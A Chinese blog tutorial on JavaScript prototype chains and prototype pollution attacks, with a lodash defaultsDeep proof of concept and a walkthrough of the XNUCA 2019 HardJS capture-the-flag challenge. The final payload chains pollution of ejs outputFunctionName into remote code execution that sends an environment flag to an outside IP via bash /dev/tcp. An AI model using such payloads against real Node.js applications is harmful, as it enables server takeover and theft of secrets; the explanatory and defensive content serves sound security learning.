---
title: Javascript 原型链污染攻击学习
tags:
  - JavaScript
  - Summary
date: 2019-09-10 16:18:55
---

![](/assets/images/move/2019-09-10-22-03-42.png)


## 0x01 prototype / \_\_proto\_\_

在 JavaScript 中，我们通常以**构造函数**的方式来定义一个类：

```js
function Foo() { //Foo类的构造函数
  this.bar = 1; //Foo类的一个属性
}
new Foo();
```
> 为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖。

同样地，我们可以在构造函数内部定义类的方法：

```js
function Foo() { 
  this.bar = 1;
  this.show = function() {
    console.log(this.bar);
  }
}
(new Foo()).show()
```

当我们通过这样的方式定义一个类的方法时会存在一些问题，每当我们创建一个`Foo`类对象时，`this.show=function...`就会执行一次，这里的`show`方法实际上是绑定在**对象**上的，而不是绑定在**类**中。

我们希望在创建类的时候只创建一次`show`方法，这时就需要用到原型（prototype）了：

```js
function Foo() { 
  this.bar = 1;
}

Foo.prototype.show = function show() {
  console.log(this.bar);
}

let foo = new Foo()
foo.show()
```

![](/assets/images/move/2019-09-10-16-49-57.png)

我们可以认为原型 `prototype` 是类 Foo 的一个属性，这个属性包含一个对象（ prototype 对象），所有实例对象需要共享的属性和方法，都放在这个对象里面；那些不需要共享的属性和方法，就放在构造函数里面。我们可以通过 `Foo.prototype` 来访问 Foo 类的原型，而 Foo 实例化的对象则可以通过 `__proto__` 来访问 Foo 类的原型，也就是说：

```js
Foo.prototype == foo.__proto__
```

由于所有的实例对象共享同一个prototype对象，那么从外界看起来，prototype对象就好像是实例对象的原型，而实例对象则好像"继承"了prototype对象一样。简单总结如下：

1. prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法.

2. 一个对象的\_\_proto\_\_属性，指向这个对象所在的类的prototype属性.


## 0x02  constructor

每个原型（prototype）对象都有一个 `constructor`，指向相关联的构造函数，实例对象也可以访问 `constructor` 属性指向其构造函数。对应前面所定义的 Foo 类及实例化对象 foo 则存在以下关系：

```js
// Foo.prototype <-> Foo
> Foo.prototype //Foo类的原型对象
Foo { show: [Function: show] }
> Foo.prototype.constructor //Foo类原型对象的构造函数
[Function: Foo]
> foo.constructor //foo实例化对象的构造函数
[Function: Foo]
```

![](/assets/images/move/2019-09-10-16-23-45.png)


## 0x03 JavaScript 原型链继承

所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。

比如：

```js
function Father() {
  this.first_name = 'Donald'
  this.last_name = 'Trump'
}

function Son() {
  this.first_name = 'Melania'
}

Son.prototype = new Father()
let son = new Son()
console.log(`Name: ${son.first_name} ${son.last_name}`)
```
Son 类继承了 Father 类的 `last_name`属性，最后输出结果为 `Name: Melania Trump`。

对于对象`son`，在调用`son.last_name`时，JavaScript引擎会进行如下操作：

1. 在对象son中寻找last_name
2. 如果找不到，则在`son.__proto__`中寻找last_name
3. 如果仍然找不到，则继续在`son.__proto__.__proto`中寻找last_name
4. 依次回溯查找，指导找到`null`结束，比如`Object.prototype`的`__proto__`即为`null`


![](/assets/images/move/2019-09-10-17-59-34.png)

JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。简单总结如下:

1. 每个构造函数(constructor)都有一个原型对象(prototype)
2. 对象的\_\_proto\_\_属性，指向类的原型对象prototype
3. JavaScript使用prototype链实现继承机制



## 0x04 什么是原型链污染？

在JavaScript中访问一个对象的属性可以用`a.b.c`或者`a["b"]["c"]`来访问。由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。因此我们可以通过`a["__proto__"]`的方式去访问其原型对象。

在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。比如：

![](/assets/images/move/2019-09-10-17-36-42.png)


## 0x05 原型链污染场景

在实际应用中，通常能够找到控制数组（对象）的**键名**的操作即可能存在原型链能够被攻击者修改。原型对象污染经常会出现在一些通过用户输入获得的 JSON 对象进行的一些不安全的**merge**、**clone**、**extend** 和 **path assignment** 操作。

以对象 merge 为例，想象一个简单的 merge 函数：

```js
function merge(target, source) {
    for(let attr in source) {
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
    return target;
};
```

Merge 方法遍历 Obj source，并将其中存在的任何属性添加到目标对象，这很简单。但是如果 source 由第三方提供，也许会使问题变得复杂起来。

攻击者会通过提给你含有 `__proto__` 属性的 JSON 数据来进行原型对象污染，比如：

```js
{
  "foo": "bar",
  "__proto__": {
    "polluted": "true",
  }
}
```

如果为未经安全处理（字段）就将此 payload 提供给 merge 方法进行合并操作，将会污染原型对象。

![](/assets/images/move/2019-09-10-22-50-43.png)

污染的严重性取决于 payload 的类型和在对象中使用的方式，如果你使用它们去认证 admin：

```js
if(user.isAdmin) {
  // do something
}
```

这种情况下攻击者可以通过污染 `isAdmin` 属性从而进一步获取敏感信息。如果攻击者修改了一些已经存在的属性导致非预期的返回类型（比如 toString 返回 integer）将会导致应用程序产生冲突（**Denial of Service**）或者利用服务中的代码执行（比如 **node.js exec** / **eval**）实现远程代码执行 RCE。

对于上述的 merge 实例，简单的修复方式就是防止**键名**为`__proto__`的属性被合并。

```js
var merge = function(target, source) {
    for(var attr in source) {
        if(attr === "__proto__") continue; // Do not merge the property if it's name is __proto__
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
    return target;
};
```


## 0x06 实例分析


### XNUCA 2019 Qualifier HardJS

![](/assets/images/move/2019-09-10-23-50-34.png)

简单分析发现`admin`账户已存在，题目要求获取管理员密码，路由分析如下：

- `/` 首页
- `/static` 静态文件
- `/sandbox` 显示用户HTML数据用的沙盒
- `/login` 登陆
- `/register` 注册
- `/get` json接口 获取数据库中保存的数据
- `/add` 用户添加数据的接口

![](/assets/images/move/2019-09-10-23-57-47.png)

审阅源码发现系 Node.js Express 应用，猜测很可能是 prototype 原型链污染。

注意到 server.js 中 如下代码：

![](/assets/images/move/2019-09-11-00-03-23.png)

lodash 是为了弥补 JavaScript 原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作，lodash.merge 出现过原型链污染漏洞，查询到 defaultsDeep 方法示例如下，同时接收了`JSON.parse( raws[i].dom )`数据，问题极可能出现在此处。

> _.defaultsDeep(object, \[sources\])
> 这个方法类似 _.defaults，除了它会**递归**分配默认属性。
> 注意: 这方法**会改变源对象**

```js
_.defaultsDeep({ 'user': { 'name': 'barney' } }, { 'user': { 'name': 'fred', 'age': 36 } });
// => { 'user': { 'name': 'barney', 'age': 36 } }
```

在 package-lock.json 中 获取到 lodash 版本为 4.17.11：

![](/assets/images/move/2019-09-11-00-01-49.png)

对应找到 [原型链污染漏洞](https://snyk.io/vuln/SNYK-JS-LODASH-450202) 影响 lodash 包 4.17.12 以下版本。

> The function `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.

Poc:

```js
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"a0": true\}\}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```

验证如下：

![](/assets/images/move/2019-09-11-00-14-31.png)

我们可以通过 JSON 利用 defaultsDeep 进行原型链污染，下一步需要找到一个 eval 动态执行的地方才能 RCE，跟进到动态模板库 `ejs`：

![](/assets/images/move/2019-09-11-00-21-15.png)

再看后面有动态函数生成：

![](/assets/images/move/2019-09-11-00-23-41.png)

所以需要伪造 outputFunctionName 为一段恶意代码，就可以实现rce ，payload如下：

```js
{"type":"test","content":{"constructor":{"prototype":
{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('b
ash -c \"echo $FLAG>/dev/tcp/139.180.192.11/10000\"')//"\}\}\}\}
```



## 0x07 参考链接

1. [Javascript继承机制的设计思想 - 阮一峰](http://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html)

2. [深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

3. [JavaScript 原型链污染](https://www.smi1e.top/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/)

4. [What is prototype pollution and why is it such a big deal?](https://medium.com/@dani_akash_/what-is-prototype-pollution-and-why-is-it-such-a-big-deal-2dd8d89a93c)

5. [NeSE-Team/OurChallenges/XNUCA2019Qualifier/](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/)

6. [XNUCA2019 Hardjs题解 从原型链污染到RCE](https://xz.aliyun.com/t/6113)